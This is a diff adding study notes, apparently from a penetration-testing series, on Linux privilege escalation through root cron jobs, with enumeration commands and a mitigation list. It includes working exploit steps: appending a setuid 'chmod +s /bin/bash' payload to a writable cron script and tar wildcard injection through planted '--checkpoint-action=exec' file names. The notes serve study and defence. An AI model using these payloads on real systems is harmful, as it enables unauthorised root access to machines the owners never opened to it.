@@ -1,0 +1,64 @@
+# Privilege Escalation: Cron Jobs
+
+## Concept
+If a cron job runs as root and executes a script/binary that a lower-privileged user can modify (or is called via a relative path/wildcard), that's an escalation path.
+
+## Enumeration
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
+crontab -l                              # current user's cron
+crontab -l -u <other_user> 2>/dev/null  # needs privilege
+cat /var/spool/cron/crontabs/*  2>/dev/null
+```
+
+Check file permissions on anything referenced:
+```bash
+ls -la /path/to/script_called_by_cron
+```
+
+Watch live with `pspy` to catch cron jobs you don't have read access to config for:
+```bash
+./pspy64
+```
+
+## Exploitation Scenarios
+
+### 1. Writable script called by root's cron
+```bash
+echo -e '#!/bin/bash\nchmod +s /bin/bash' >> /path/to/writable_script.sh
+# wait for cron to trigger
+/bin/bash -p
+```
+
+### 2. Wildcard injection (tar/rsync wildcard abuse)
+If root's cron runs something like:
+```bash
+tar -czf backup.tar.gz *
+```
+in a directory you can write to, you can plant files that get interpreted as tar options:
+```bash
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "chmod +s /bin/bash" > shell.sh
+chmod +x shell.sh
+# wait for cron
+```
+
+### 3. PATH manipulation in cron scripts
+If a cron script calls a binary without full path and `PATH` is user-controllable — see file 09.
+
+### 4. Cron job frequency
+Note the schedule (`* * * * *` format) to time your exploit window.
+
+## Checklist
+- [ ] Read `/etc/crontab` and `/etc/cron.*`
+- [ ] Check write permissions on any script referenced
+- [ ] Check for wildcard usage in commands (tar, rsync, chown)
+- [ ] Use `pspy` if config access is limited
+- [ ] Confirm the job actually runs as root
+
+## Mitigation
+- Restrict write access to cron scripts and their directories
+- Use full paths in cron commands, avoid wildcards
+- Set explicit `PATH` at the top of cron scripts
